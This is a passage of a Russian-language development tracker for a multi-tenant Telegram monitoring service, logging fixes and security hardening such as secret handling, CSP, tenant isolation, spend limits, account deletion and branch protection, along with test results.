| 9.13 Секреты формы не стираются пустым полем | ✅ готово (статический + поведенческий на node) | 2026-09-08 | найдено владельцем на проде: ключ OpenRouter, токен бота и адрес вебхука не сохранялись — форма отвечала 200, всплывало «Сохранено», в журнале появлялась запись SETTINGS/SUCCESS, а `has_key` оставался `false` и тест бота отвечал «Токен бота не задан». Сервер различает три состояния секрета (С16): поля нет — не трогать, `""` — стереть, значение — записать. Интерфейс же слал `input.value.trim()` всегда, а поле после загрузки пустое по построению — сырой секрет наружу не отдаётся (К3). То есть каждое сохранение уходило командой «сотри». **Почему прошло мимо зелёных тестов:** `test_53` проверял ровно этот контракт, но со стороны сервера — посылая запрос БЕЗ поля; предположение о том, что интерфейс поле опустит, никто не проверял. Теперь секрет попадает в тело только через `withSecret` (пустое опускается), очистка — отдельная кнопка с явным `""`, состояние секрета рисует `showSecretState` с обеими ветками. Заодно: адрес вебхука вообще не загружался — `loadConfig` читал его у `/api/monitors`, который его не отдаёт |
| 8.6a Первый сквозной проход данных | ✅ подтверждено живым прогоном | 2026-09-08 | Telegram → дедупликация → лента → доставка отработали трижды: 17:43 (16 и 20 сообщений), 23:43 (3 сообщения), `delivery_status` SUCCESS. Отпечатки ключа шифрования совпали (`d97b5bf8` у web и воркера) — прежние `EncryptionKeyMismatch` прекратились. **Анализ не проверен:** `model_name` = «MTProto Direct», ключ OpenRouter не задан |
| 10.3 Гейты на живом Postgres | ✅ готово | 2026-09-07 | прогон 34137201000 на `main` (8aaa8cc): 448 passed, 4 skipped на живом Postgres; pip-audit — уязвимостей нет; секрет-скан чист и по истории, и по дереву; ruff, mypy (49 файлов), bandit чисто. Гейты идут на каждом PR, а не разово |
| 10.2 Наблюдаемость (часть) | ✅ готово (поведенческий уровень) | 2026-09-07 | `GET /api/ops/health` под входом: доступность базы, удар сердца воркера (отметка ставится В ТИКЕ — зависший внутри тика процесс обязан выглядеть мёртвым), размер и возраст очереди. Таблица `worker_heartbeats` (ревизия `0010`), строка состояния на вкладке «Журнал». `/health` не менялся: подробности состояния анониму не показываются. **Осталось в 10.2:** боевой перенос старой базы — действие оператора |
| 9.9 Действие аккаунта — сессией аккаунта | ✅ готово (поведенческий уровень) | 2026-09-07 | найдено на живом аккаунте: добавление канала падало с AUTH_KEY_UNREGISTERED. Разрешение канала брало клиента у зависимости ВХОДА, а успешный вход съедает попытку — значит сессия пустая. Появился `get_account_client` (сессия подключённого аккаунта, короткоживущий), на него переведены резолвер каналов и список диалогов; свип запрещает клиенту входа появляться вне send-code/sign-in |
| 9.8 Инлайновые обработчики убиты CSP | ✅ готово (статический уровень + живая проверка) | 2026-09-07 | найдено владельцем: после входа не переключалась ни одна вкладка. `script-src 'self'` (7.2) запрещает инлайновые обработчики так же, как инлайновые скрипты, а 5.1 оставила их «минимальным портом»: 5 в разметке и 7 в шаблонах модулей — карточки ленты, кнопки каналов, «развернуть», выбор модели. Всё переведено на делегирование по `data-`атрибутам; свип по разметке И модулям запрещает возврат |
| 9.7 Код подтверждения и сессия входа | ✅ готово (поведенческий уровень) | 2026-09-07 | найдено на живом Telegram: `sign_in` отвечал PHONE_CODE_EXPIRED при вовремя введённом коде. Telegram привязывает попытку к auth-key сессии, вызвавшей `send_code_request`, а web поднимал пустую `StringSession` на каждый запрос — второй шаг шёл другим auth-key. Сессия попытки хранится зашифрованной в `tg_auth_attempts` (ревизия `0009`), зависимость продолжает ЕЁ. **Не подтверждено:** живой вход |
| 9.6 Интерфейс закрыт по умолчанию | ✅ готово (статический уровень + живая проверка) | 2026-09-07 | найдено владельцем на проде: аноним в корне получал полную оболочку, восемь 401 в консоли и «Ошибка загрузки настроек», а ссылки на вход на экране не было. SPA спрашивает `/auth/me` до запуска загрузчиков, любой 401 уводит на `/login` с возвратом по `?next=` (только относительный путь — иначе открытый редирект), вошедший не залипает на форме входа, в шапке видно кабинет и появилась кнопка выхода из него |
| 9.5 Ключи MTProto — пользователя | ✅ готово (поведенческий уровень) | 2026-09-07 | решение владельца по открытому вопросу №1: каждый вносит свои `api_id`/`api_hash` в кабинете, `api_hash` шифруется и наружу не отдаётся. Таблица `telegram_credentials` (ревизия `0008`), `POST /api/telegram/credentials`, поля в ⚙️ MTProto. Отката на ключ сервиса нет — свип держит отсутствие `telegram_api_*` в `app/`. **Не подтверждено:** живой вход через Telegram |
| 9.4 Логи и границы тенантов | ✅ готово (поведенческий уровень) | 2026-09-07 | затирание секретов перенесено с вызовов на КАНАЛ: фабрика записей `logging` — через неё проходит запись любой библиотеки, включая трейсбеки `exc_info` и логи uvicorn/telethon. Четыре ручных фильтра `user_id ==` в воркере, диспетчере и гейтвее переведены на `TenantRepo`; структурный свип держит правило |
| 8.3 Статика и маршрутизация Vercel | ✅ готово (подтверждено живым деплоем) | 2026-09-07 | доведено до зелёного и влито; живая проверка нашла ещё два дефекта: глубокие ссылки SPA давали 404 (`cleanUrls` + назначение `/index.html`) и GSAP грузился с cdnjs мимо `script-src`. Оба закрыты, GSAP лежит в `static/js/vendor/` |
| 8.4 Живой Railway | ✅ готово (подтверждено живым деплоем) | 2026-09-07 | источник подключён обоим сервисам, ветка влита в `main`. Два дефекта развёртывания: команда запуска без оболочки (`$PORT` литералом) и целевой порт домена 8000 при слушающем 8080 — снаружи 502 при «здоровом» сервисе. `web` отвечает 200, воркер пишет «воркер стартовал» |
| Сохранение промпта роняло обход каналов | ✅ готово (статический + поведенческий) | 2026-09-10 | владелец: «Cannot read properties of null (reading 'value')» при сохранении промпта. Один атрибут `data-channel-id` стоял и на СТРОКЕ канала, и на кнопке удаления ВНУТРИ неё, а сохранение обходило `querySelectorAll('[data-channel-id]')` — выборка отдавала строку и кнопку. На кнопке `.channel-limit` не находится, чтение `.value` у `null` роняло обработчик. **Цена не в сообщении:** порядок обхода документный, поэтому правки ПЕРВОГО канала сохранялись, падение случалось на его же кнопке, а каналы со второго по последний не сохранялись вовсе — молча. Строка получила собственный маркер `data-channel-row`; кнопка оставила `data-channel-id`, которым адресует канал. `test_121`: атрибут, по которому перечисляют строки, обязан встречаться в шаблоне строки ровно один раз. Свипы 11.7 этого не ловили — они сверяют `getElementById` с `index.html`, а тут элементы рождаются в шаблоне модуля. **Найдена и дыра в наборе:** тесты покрывали СОЗДАНИЕ канала с промптом, но не ПРАВКУ — путь, которым пользуются каждый день; добавлены два теста, включая правку всех каналов, а не только первого |
| 12.1 Точка входа перестаёт врать | ✅ готово (статический свип) | 2026-09-10 | ревью нашло, что `CLAUDE.md` полторы фазы описывал `server.py` как «весь бэкенд» и предлагал команду `uvicorn server:app`, которая падает: монолит снят задачей 7.4. Документ читается ПЕРВЫМ каждую сессию по собственному протоколу — неверную картину мира получал каждый, кто протокол выполнял. Раздел «Текущее состояние» переписан по сверенному дереву (17 таблиц, 11 модулей JS, два процесса из одного образа, адреса прода), добавлен раздел «Крайне важные факты»: потеря `APP_ENCRYPTION_KEY` невосстановима, миграции идут ДО старта нового кода (отсюда expand/contract), Docker — боевой путь, `AsyncSession` не терпит одновременности, `rollback()` аннулирует всю сессию, тесты — единственная работающая проверка. `test_120` держит машинно проверяемую часть: путь из блока команд обязан существовать, монолит не упоминается как живой; проверено на прежней версии документа — краснеет. Прозу обязан пересматривать человек. **Остальные находки ревью — фаза 12, раздел 16** |
| 12.3 Мёртвый код интерфейса | ✅ готово (статический свип со self-test'ами) | 2026-09-13 | **план обещал два адреса, свип нашёл четыре.** Экспортов без единого использования оказалось три, а не один: `formatNextRun` (`render.js`, вдобавок собирала HTML строками — приём, запрещённый `test_48`), `esc` (`render.js`) и `mergeMessages` (`messages.js`). Последний — не просто мёртвый: он вливал в таблицу посты СИНХРОННОГО прогона монолита, а прогон с 11.6 асинхронный (202 queued, работу делает воркер) — то есть функция пережила архитектуру, а комментарий в шапке модуля всё ещё описывал ребро `channels → messages`, которого нет. Обе ветки `item.photo_base64` в `feed.js` убраны: оба эндпоинта строятся одним `_card`, поля в ответе нет ни в списке, ни в детали. Маркер `esc(` убран и из `ESCAPING_CALLS` `test_02`: маркер живёт дольше кода, и сканер благословлял бы вызов функции, которой больше нет, — то есть признавал бы безопасным `ReferenceError`. Сканер закрыт `test_122` с тремя self-test'ами (краснеет на подложенном мёртвом экспорте, не краснеет на экспорте, который зовут в своём же файле, не считает упоминание в комментарии использованием — именно этим и держался `mergeMessages`). Второй свип сверяет `item.*` в `feed.js` с `_LIST_FIELDS` API — стык, которого не видели свипы 11.7: они сверяют `getElementById` с разметкой, а здесь оба конца данные. **Красная фаза:** 2 failed на `assert`. Прогон: **599 passed, 7 skipped**, ruff и mypy чисто |
| 12.4 Следы монолита в конфигурации | ✅ готово (статический свип со self-test'ами) | 2026-09-13 | **два следа оказались разными по природе, и лечатся они по-разному.** Исключение `"server.py"` из `extend-exclude` в `ruff.toml` убрано совсем: исключение — это разрешение не проверять, и выданное пустому месту оно не сработает, не пожалуется и переживёт любую уборку. Правило `server.py` в `.dockerignore` **оставлено**: снимать страховку не за что — `COPY . .` заберёт всё, что окажется в контексте, стоит правило одну строку, а `test_70` держит его как глубину защиты. Врать оно перестало не удалением, а прошедшим временем. Комментарии в `Dockerfile`, `Procfile`, `.dockerignore` и докстроки `test_70` переписаны: монолит снят задачей 7.4, проверки — заслон на случай возврата. `test_123` закрывает оба правила: буквальное исключение из линта обязано быть в `git ls-files`, а упоминание монолита в конфигурации допустимо только рядом с пометкой, что его больше нет (тот же приём с окном, что в `test_120` для `CLAUDE.md`), — три self-test'а сканера. Побочное следствие, полезное для 12.2: правило про линт **сцепляет** `ruff.toml` с судьбой четырёх скриптов — перенос или удаление без правки конфигурации теперь краснеет. **Красная фаза:** 2 failed на `assert`. Прогон: **605 passed, 7 skipped**, ruff и mypy чисто |
| 12.6 Правило `TenantRepo` и код | ✅ готово (статический свип + 43 поведенческих на переписанных путях) | 2026-09-13 | **ручных мест не десять, а двадцать** — план считал по старому дереву. Разделены по свойству, а не по файлу: **есть `repo` в функции — ручной фильтр запрещён**. Таких оказалось семь, все переведены: `sources.py`, `cleanup.py`, `integrations.py`, `journal.py` и три места в `feed.py`. Для удаления не было парного метода — очистки писали `delete(Model).where(...)` руками; добавлен `TenantRepo.delete()`, и это не симметрия ради симметрии: забытый `where` в чтении отдаёт чужое, забытый `where` в удалении стирает данные ВСЕМ клиентам разом. Оставшиеся двенадцать — там, где репозитория нет: службы `app/services/` (`user_id` приходит аргументом, зовёт воркер) и доавторизационные пути `auth.py`/`telegram.py` (собственные записи пользователя, репозитория ещё не существует). Исключение **записано в `AGENTS.md`** ровно в той форме, которую нельзя растянуть, и `test_124` проверяет именно свойство (`repo` в функции → нельзя), а список файлов закрепляет отдельно, чтобы не рос молча. Попутно: свип нашёл `SyntaxWarning: invalid escape sequence '\\w'` в докстроке `app/services/journal.py` — в будущих версиях Python это ошибка синтаксиса; докстрока сделана сырой. **Красная фаза:** 3 failed на `assert`. Прогон: **612 passed, 7 skipped**, ruff и mypy чисто |
| 12.8 SPA: 5xx и офлайн | ✅ готово (поведенческий в node + стык разметки и стилей) | 2026-09-13 | перехват 401 был единственным и появился после живого деплоя 7 сентября; 5xx и обрыв сети оставались без хозяина. Лечится **не тостом**: тост живёт три секунды, а сервер лежит минутами — добавлена полоса состояния наверху, которая ДЕРЖИТСЯ до успешного ответа и одна на всё приложение. Обрыв сети вдобавок подменяет сообщение: вызывающий код показывает `e.message`, а браузер говорит `Failed to fetch` (Safari — `Load failed`) — подмена сделана в одном месте, а не в двадцати `catch`. Проверка поведенческая (node с подставными `fetch` и `document` прогоняет 200 → 500 → обрыв → 200), потому что вопрос не «есть ли в файле слова», а «что увидит человек». **Регрессия, пойманная тестами по дороге:** поиск элемента на верхнем уровне модуля сделал `api.js` неимпортируемым без DOM и уронил `test_102` (он гоняет `secrets.js` в node, а тот тянет `api.js`) — поиск перенесён в момент показа, свойство закреплено отдельным тестом. Правило показа проверяется в `test_125`, а не `test_118`: тот связывает id с правилом по образцу `const x = getElementById(...)`, которого здесь больше нет, и промолчал бы. Проверено подменой правила — краснеет. **Красная фаза:** 4 failed на `assert`. Прогон: **618 passed, 7 skipped**, ruff и mypy чисто |
| 12.7 Расход в разрезе канала | ✅ готово (схема + сквозной прогон источника + эндпоинт) | 2026-09-13 | разрез сделан **отдельной таблицей** `llm_usage_slices`, а не колонками в `llm_usage`, и это не вкусовщина: месячный гейт читает ОДНУ строку на (тенант, период) через `scalar_one_or_none`, и строки по каналам в той же таблице уронили бы его на второй — сломав защиту от неограниченного счёта ради отчёта. Источник назван **публичным** id, а не внешним ключом на `monitors`: ключ дал бы либо каскад (история трат исчезает вместе с источником), либо отказ удаления, плюс наружу внутренние BIGINT не отдаются (контракт 9.10). Оба счётчика пишутся в ОДНОЙ транзакции — иначе сумма однажды разойдётся с расходом, и отчёт, по которому решают, какой канал отключить, начнёт врать; сходимость закреплена тестом. Сквозная проверка гоняет настоящий `poll_source` с подменой только обращения к модели: половины стыка порознь мало — ошибка передачи адреса выглядела бы как исправный отчёт, где всё свалено в «вне источника» (проверено снятием параметра — краснеет). Ревизия `0015` только СОЗДАЁТ таблицу, окна отказа при выкладке нет. Добавлен `GET /api/usage`: всего, по источникам, по каналам, по убыванию расхода. Свип изоляции `test_30` подхватил новый список сам и потребовал посева — расход посеян ОБОИМ тенантам, поэтому и проверка утечки на этом маршруте настоящая. **Красная фаза:** 9, затем 4 failed. Прогон: **635 passed, 7 skipped**, ruff и mypy чисто. **Не сделано намеренно:** показ в интерфейсе — вынесен в 12.10 отдельной задачей |
| 12.10 Расход в интерфейсе | ✅ готово (поведенческий в node + разметка) | 2026-09-13 | карточка «Расход токенов за месяц» встала во вкладке «Интеграции» рядом с ключом и моделью: решение «какой канал отключить» принимают там же, где включают AI. Разметку строит отдельный модуль `usage.js`, и его главная функция **чистая** — данные на входе, строка на выходе; поэтому она исполняется в node, а не разбирается регулярками: вопрос «что увидит человек при нулевом расходе» иначе не проверить. Нулевой расход показывает фразу, а не пустое место — то же правило, что в 12.8. Каналы не пересортировываются: порядок задаёт сервер, два разных порядка на одни данные — два разных ответа. **Ошибка в тесте, исправлена в тесте:** проверка живого обработчика была списана с `test_48` (`<\\S+[^>]*onerror`), где все теги идут с атрибутами; здесь теги голые (`<span>`), `\\S+` съедает закрывающую скобку, и правильно экранированный ТЕКСТ считался инъекцией — тест краснел на исправном коде. Образец переписан так, чтобы `[^>]*` не выходила за пределы своего тега, и проверен в обе стороны. **Регрессия, повторённая и пойманная сразу:** `document.getElementById` на верхнем уровне модуля снова сделал его неимпортируемым без DOM — тот же промах, что в 12.8 часом раньше. **Красная фаза:** 8 failed. Прогон: **643 passed, 7 skipped**, ruff и mypy чисто |
| 12.2a Боевые зависимости | ✅ готово (статический свип по AST) | 2026-09-13 | **половина 12.2, которая не ждёт решения:** судьба четырёх скриптов — выбор владельца, а вот `rich` и `tabulate` уходят из боевого `requirements.txt` при любом исходе. `tabulate` оказался хуже, чем описывало ревью: его не импортирует **вообще никто** — ни скрипты, ни приложение, — пакет ставился в каждый образ ради кода, которого нет; удалён совсем. `rich` переехал в `requirements-dev.txt` (2.9 МБ с каждого деплоя и лишняя строка в `pip-audit`, который идёт именно по боевому списку); инструменты в корне работать не перестали — dev тянет боевой список целиком. `test_128` закрепляет правило: каждый пакет боевого списка либо импортируется тем, что исполняют боевые процессы (`app/`, `alembic/`, `scripts/` — последний включён намеренно, перенос базы 10.2b идёт на том же образе), либо назван в списке исключений **с причиной**; обратная сторона тоже закрыта — объяснение, пережившее свой пакет, краснеет (ровно чем была строка `server.py` в `ruff.toml`). Проверено в обе стороны. Прогон: **646 passed, 7 skipped** |
| 12.2 Осиротевший остров | ✅ готово (решение владельца 2026-09-13: удалить) | 2026-09-13 | четыре скрипта удалены. Причина не в объёме, а в том, что их модель **противоречит архитектуре**: все четыре работают с локальным `.env` и файлом `personal_account.session` — миром до мульти-тенанта. Сейчас сессии лежат в БД зашифрованными, вход идёт через веб, а запуск такого скрипта дал бы второй долгоживущий клиент на том же auth-key, то есть `AUTH_KEY_DUPLICATED` у живого аккаунта. Вместе с ними ушли исключения из `ruff.toml` (иначе краснеет `test_123`) и `rich` — держать зависимость стало не для кого. Правило закреплено в `test_03`: в корне нет исполняемых `.py`, новый инструмент кладут в `scripts/`. **Ошибка в тесте, исправлена в тесте:** антивакуумная страховка `test_123` требовала трёх буквальных исключений в живом `ruff.toml` — так она доказывала, что разбор работает. Доказательство продержалось до этой задачи: исключений не осталось, и тест покраснел на ПРАВИЛЬНОМ состоянии. Разбор переведён на синтетический образец — он не устаревает от уборки, а живой список свободен быть пустым. **Находка дороже самой уборки:** исключение `"auth.py"` стояло ради скрипта в корне, а ruff сверяет запись с ИМЕНЕМ файла в любом месте дерева — под неё попадал и `app/api/auth.py`, **роутер входа и регистрации**. Один из самых чувствительных файлов проекта не проверялся линтером и не форматировался; вскрылось это только когда удаление скрипта сняло исключение и `ruff format` впервые его тронул. Ущерб косметический (`ruff check` ошибок не нашёл), механизм — тихий. Закрыто в `test_123`: буквальное исключение обязано попадать ровно в один файл; проверено возвратом прежней строки — краснеет. Прогон: **649 passed, 7 skipped** |
| 12.5 Документы-сироты | ✅ готово (решение владельца 2026-09-13) | 2026-09-13 | **«сирота» оказалось слишком грубым словом для одного из двух.** `DESIGN-webflow.md` — источник дизайн-системы: палитра `static/css/main.css` (`#080808`, `#7a3dff`, `#ed52cb`…) взята оттуда дословно. Документ не осиротел — на него просто никто не сослался, и это разные беды с разным лечением; внесён в карту с пометкой, что цвета правят там же. `Telegram_Parser_Telethon.md` переехал в `private-backups/`: его выводы давно в коде и `AGENTS.md`, а 24 КБ уезжали в каждый образ. `test_129` закрепляет правило обеими сторонами: документ в корне либо назван в карте, либо его в репозитории нет; строка карты, пережившая свой файл, тоже краснеет. Заодно в карту внесены `PLAN.md`, `PLAN_REFINEMENT.md` и `GEMINI.md` — они тоже лежали без объяснения. **Ошибка в тесте, исправлена в тесте:** разбор брал раздел целиком и покраснел на собственном пояснении (абзац рассказывает, куда уехал файл) — карта это ТАБЛИЦА, проза вокруг обязана говорить о прошлом, за ней следит `test_120`. Прогон: **652 passed, 7 skipped** |
| 12.9 Защита ветки `main` | ✅ готово (включено 2026-09-13, решение владельца: строго) | 2026-09-13 | пять джобов перестали быть совещательными: `required_status_checks` со списком `lint secret-scan security test typecheck`, **`enforce_admins: true`** — иначе защита не мешает ровно тем, кто нарушал правило (и агент, и владелец администраторы). Обзор не требуется: второго человека нет, требование ревью остановило бы выкладку насовсем. `strict` выключен: он требует свежести ветки, то есть ручной перебазировки каждого PR ради проверки, которая о качестве кода молчит. `allow_force_pushes` и `allow_deletions` — `false`: переписать историю `main` или снести ветку теперь нельзя. **Проверено обходом:** прямой `git push origin HEAD:main` отвергнут сервером. Включению предшествовал сбой GitHub (Pull Requests в major outage), поэтому защита ставилась ПОСЛЕ слияния всей готовой работы — включить её раньше значило запереть недоделанное за собственным заслоном |
| Отказ одного канала не роняет источник | ✅ готово (поведенческий: подменённый отказ СУБД на первом канале) | 2026-09-14 | продолжение разбора дубля. Правило «один канал не роняет источник» в `poll_source` применялось **только к выборке**: неудача Telegram ловилась, канал объявлялся неразобранным, прогон шёл дальше. Всё, что после выборки — запись разрешённого канала, дедупликация, два коммита — шло голым, и любой отказ СУБД уносил ВЕСЬ прогон вместе с каналами, которые уже разобрались. Дубль был одним входом в эту дыру, но не единственным: гонка в дедупликации и обрыв соединения дают то же самое. Сохранение обёрнуто тем же обработчиком, что и выборка: откат, счётчик отказов канала, внятная запись в журнал, `continue`. Обращений к ORM-объектам после отката нет — `name` берётся из плана обычной строкой, канал перечитывается заново (факт 4 CLAUDE.md). **Красная фаза:** отказ на первом канале выносил прогон целиком, второй канал до модели не доходил. Прогон: **672 passed, 7 skipped** |
| 13.3 Тревога в бота владельца | ✅ готово (поведенческий: подставной отправитель, подложенная отметка воркера) | 2026-09-14 | решение владельца: слать в **тот же бот**, которым уходят сводки — токен и чат уже настроены и проверены живой кнопкой, второй канал означал бы второй способ его не настроить. `alert_owner` в `app/services/alerts.py`. Четыре правила закреплены тестами: выключатель сводок тревогу **не гасит** (он про дайджесты, а не про «сервис встал»); одна тревога — раз в час по ключу (падающий источник иначе превращает бота в шум, а шум читают как тишину); отказ Bot API не роняет вызывающего; в тексте нет токена. Окно хранится в журнале, а не в своей таблице — отдельная схема ради счётчика повторов это миграция и риск выкладки. `add_log` получил необязательный `timestamp`: правило, которое СЧИТАЕТ по времени журнала, иначе непроверяемо. **Поймано тестом в самой тревоге:** первая версия делала `rollback()` в ветке отказа — откатывать нечего (упал HTTP, не база), зато он обесценивает сессию ВЫЗЫВАЮЩЕГО, и воркер получил бы `MissingGreenlet` на своих же объектах (факт 4, третий случай за сутки). Правило закреплено отдельным тестом. Поводов два: **простой воркера** (поднявшийся процесс видит чужую отметку и её возраст — ловит падение с перезапуском; воркера, которого не поднимают вовсе, НЕ ловит, и это сказано прямо) и **источник, не давший ни одной находки**. Свип словаря 11.7 отверг слово «Мониторинг» в тексте тревоги — исправлено на «Опрос источников». Прогон: **687 passed, 7 skipped** |
| 13.4 План не спорит с собой | ✅ готово (статический свип со self-test'ами) | 2026-09-14 | в плане два вида текста: описание задачи и вердикт о её состоянии. Второй — дубль трекера, а дубль не бывает долговечным: обновляют трекер, проза остаётся. Разошлись четыре места, и всё это время план врал тому, кто читает его первым по собственному протоколу. **Правило:** проза вправе описывать замысел, вердикт выносит только трекер; назвала состояние — обязана совпадать. Запрещать вердикты вовсе было бы проще и неверно: «8.1 — ✅ установлена» несёт смысл абзаца, ловить надо расхождение, а не упоминание. Вместе с вердиктами исправлены три факта, которые просто неверны: «Postgres не проверен» (джоб `test` поднимает `postgres:16` и задаёт `TEST_DATABASE_URL`), «`GET /health` — заглушка» (10.2a отдаёт `GET /api/ops/health`, а 13.3 добавила толчок в бота), «четыре ручных фильтра по `user_id`» (сведены задачей 12.6, в названных файлах их нет). Шапка раздела 14 теперь говорит прямо, что ниже — замысел, а состояние только в трекере. **Красная фаза:** 4 расхождения. Проверено возвратом вердикта — краснеет. Прогон: **693 passed, 7 skipped** |
| 13.1 Человек знает, чем рискует | ✅ готово (статический свип разметки и модуля) | 2026-09-14 | открытый вопрос №3 плана, висел с 2026-09-05. В модалке подключения было три поля и кнопка — ни слова о том, что сервис подключается **от лица аккаунта** и технически читает всю переписку (так устроен MTProto, ограничить доступ только нужными каналами нельзя), что строку сессии можно отозвать **только из самого Telegram** (Настройки → Устройства), и что автоматическое чтение с пользовательского аккаунта — серая зона правил: ограничивает Telegram, а не сервис. Два правила закреплены тестами: **сказать до того, как принять номер** (предупреждение выше поля — то, что под кнопкой, читают после нажатия) и **согласие — действие, а не умолчание** (галочка снята; заранее проставленная — это оформление согласия, а не согласие). Кнопка заблокирована **в разметке**, а не только в JS: при медленной загрузке модуля нажать можно было бы раньше, чем прочитать. Оба места, где обработчик возвращал кнопку в строй, переведены на состояние согласия — иначе снятая галочка после неудачной отправки оставляла её открытой. **Красная фаза:** 5 failed. Проверено проставленной заранее галочкой — краснеет. Прогон: **699 passed, 7 skipped**. **Не сделано:** согласие не записывается на сервере — это отдельная колонка, миграция и вопрос, нужен ли юридический след |
| 13.2 Уйти и забрать своё | ✅ готово (поведенческие на aiosqlite + свип интерфейса) | 2026-09-14 | открытый вопрос №4, закрытый наполовину: автоочистка была, экспорта и удаления не было вовсе — `auth.py` знал только `/auth/me` и `/auth/logout`. Для ЭТОГО сервиса удаление не вежливость, а **способ отозвать доступ**. Поэтому `delete_account` сначала завершает сессию **в самом Telegram** (`log_out` коротким клиентом — тот же порядок, что у входа: долгоживущие клиенты только у воркера), и лишь потом стирает строки. Разница не теоретическая: стёртая строка убирает доступ у сервиса, но сессия остаётся в списке устройств пользователя, а **уцелевшая копия строки — резервная копия базы! — продолжает работать**. Обратное правило тоже закреплено: недоступный Telegram **не держит человека в заложниках** — удаление идёт до конца, а неудача попадает в лог процесса (журнал тенанта в этот момент уже удаляется). Подтверждение — собственный адрес, а не «да»: необратимое действие не должно случаться с одного нажатия, адрес нельзя набрать по инерции. Экспорт **не отдаёт доступов** (токен бота, ключ модели, строка сессии) — файл уезжает в почту и мессенджеры. Свип `test_124` поймал новый код на ручных фильтрах: чтения и удаления переведены на `TenantRepo`/`repo.delete()`, а `tg_session.py` записан в исключение `AGENTS.md` как работа с собственными записями. **Красная фаза:** 8 failed. Прогон: **710 passed, 7 skipped** |
| 13.5 Потолок расхода на канал | ✅ готово (поведенческие на конвейере + свип интерфейса) | 2026-09-14 | 12.7 показала, какой канал жжёт бюджет; ограничить его было нечем — потолок один на тенанта, и при достижении AI выключается целиком: увидеть виновника можно, а наказать только вместе со всеми. Колонка `monitor_channels.token_limit`, ревизия `0016` (только ДОБАВЛЯЕТ — окна отказа нет). Считается по разрезу 12.7, а не по общему счётчику: общий отвечает «сколько всего», потолок канала — «сколько сжёг этот». **Главное правило, оно же смысл задачи:** канал сверх потолка пропускается, **остальные каналы источника работают дальше** — иначе это тот же общий рубильник, только с лишним полем в форме. Пропуск назван в журнале: молча пропущенный канал неотличим от «в нём ничего не нашлось» (класс фазы 9). Ноль — «без потолка», колонка `NOT NULL DEFAULT 0`, а не `NULL`: «не задано» и «ноль токенов» в запросах выглядели бы одинаково, а значат противоположное. В интерфейсе ноль **не затирается через `|| 0`** — он законное значение; пустое поле превращается в ноль явно. **Красная фаза:** 4 failed. Прогон: **717 passed, 7 skipped** |
| 13.7 Свёрнутая плашка канала | ✅ готово (исполнение билдера разметки в node + свипы проводки) | 2026-09-14 | находка владельца: девять каналов, каждый развёрнут — стена полей. **Почему так вышло:** модалку построила 11.7, когда у источника был ровно ОДИН канал (ревизия `0012` дала каждому прежнему монитору единственный канал). Для N=1 вид правильный, деградирует линейно, при N=9 непригоден. Ограничение «до 10 каналов» записано в плане с самого начала, но **ни разу не было использовано как случай для проверки интерфейса**, и покраснеть было нечему: все свипы интерфейса про ПРАВИЛЬНОСТЬ, а «непригодно при девяти строках» — про СООТВЕТСТВИЕ. Свёрнутая строка: имя, лимит текстом, значок связи (вердикт 13.6), значок заполненности промпта, карандаш, корзина. **Свёрнутость — это `hidden`, а не отсутствие:** сохранение читает `.channel-limit`, `.channel-token-limit`, `.channel-prompt` из документа по КАЖДОЙ строке, и строка без полей уронила бы цикл, потеряв все каналы после себя (урок `test_121`). Скрыто разметкой, а не скриптом (урок 13.1). Удаление канала теперь спрашивает «Да/Нет» — это было единственное разрушающее действие кабинета без подтверждения. Проверка запускается при открытии окна (решение владельца) с порогом свежести 60 с по МЕСТНОМУ времени запуска: сверять серверный `checked_at` с часами браузера значит зависеть от того, что они сходятся. Пришедший вердикт **не перерисовывает строки** — затёр бы то, что человек набрал, пока шла проверка. Отказ запроса и истечение ожидания возвращают сохранённые вердикты: ⏳ навсегда — это вечное «идёт работа» там, где работы нет. **Две старые проверки поправлены:** `test_115` и `test_135` читали только `sources.js` и после переезда разметки в `render.js` зеленели от упоминаний в обработчиках — поле могло исчезнуть из разметки незамеченным. **Красная фаза:** 16 failed. Прогон: **782 passed, 8 skipped** |
| 13.6 Проверка источников | ✅ готово (поведенческие на конвейере + исполнение значка в node) | 2026-09-14 | заказ владельца после «VASILE LUNGO | INSIDER»: тот канал не разрешался **ни разу с момента добавления**, и узнать об этом было неоткуда — источник просто не давал находок, а «сегодня пусто» и «не открывался никогда» выглядели одинаково. Проверка отвечает по каждому каналу на один вопрос: **сможет ли прогон отсюда прочитать.** Идёт ТЕМ ЖЕ путём, что и прогон (`_resolve_channel` со всеми запасными ходами и прогревом кэша): проверка, которая разрешает канал по-своему, зелена там, где прогон красен, — это хуже, чем её отсутствие. Пять исходов, и все названы словами: `ok`, `no_posts`, `duplicate` (живая проблема «ТОП-вакансий» — видна теперь ДО прогона), `not_found`, `no_access`. Отдельно — **вид** найденного: канал, супергруппа, группа, бот, личный чат: `@name` бывает и каналом, и человеком, а читаются они одинаково — молча и не тем. `NULL` в колонке — «не проверяли», ТРЕТЬЕ состояние: пустое поле, нарисованное зелёным, — тот же класс, что «совпадений нет» против «не смогли посмотреть» (фаза 9). Проба идёт мимо дедупликации: иначе проверка съедала бы посты и ближайший прогон промолчал бы — «проверил и сломал». Ревизия `0018` (только ДОБАВЛЯЕТ). **Свипы поймали два своих:** XSS-свип краснел на `confirm()` в `deleteSource`, зелёном с первого дня только потому, что ближайшим маркером в окне случайно оказывался `.textContent` из соседней функции — диалоги браузера внесены в `SAFE_SINKS`; свип осиротевших стилей (13.х) краснел на `check-dot-*`, собираемых интерполяцией, — имена классов сделаны полными, потому что собранное из кусков имя не находится ничем. **Красная фаза:** 19 failed. Прогон: **766 passed, 8 skipped** |
| 13.8 Сверка с дизайн-документом | ✅ готово (свипы соответствия документу + сверка отпечатков живого кабинета после выкладки) | 2026-09-15 | заказ владельца: «насколько интерфейс соответствует тому, что реально реализовано». Сверка нашла не разъехавшиеся отступы, а **вторую систему**: экраны входа несли собственный `:root` с `#5533ff`, которого в документе нет вовсе. Рядом — `--rounded-xs` и `--hairline-strong` использовались, но нигде не объявлялись (`border-radius` текстовых полей молча отбрасывался), шкал отступов и текста не существовало (41 разный `padding`, 17 размеров шрифта, включая 12.5, 11.5 и 10.5 пикселя), а 199 инлайновых стилей обходили систему целиком и держали в политике `style-src 'unsafe-inline'`. **Почему разошлось:** документ полгода лежал в корне без единой ссылки на себя (внесён в карту только 12.5), и ни одна проверка не спрашивала, совпадает ли с ним `main.css`; все свипы интерфейса тут про ПРАВИЛЬНОСТЬ, а это — про СООТВЕТСТВИЕ, и краснеть было нечему. Восемь шагов, каждый отдельным PR и откатываемый в одиночку: фундамент (#74), цвет (#75, #76), типографика (#77), отступы (#78), начертание и размеры компонентов (#79), экраны входа (#80), 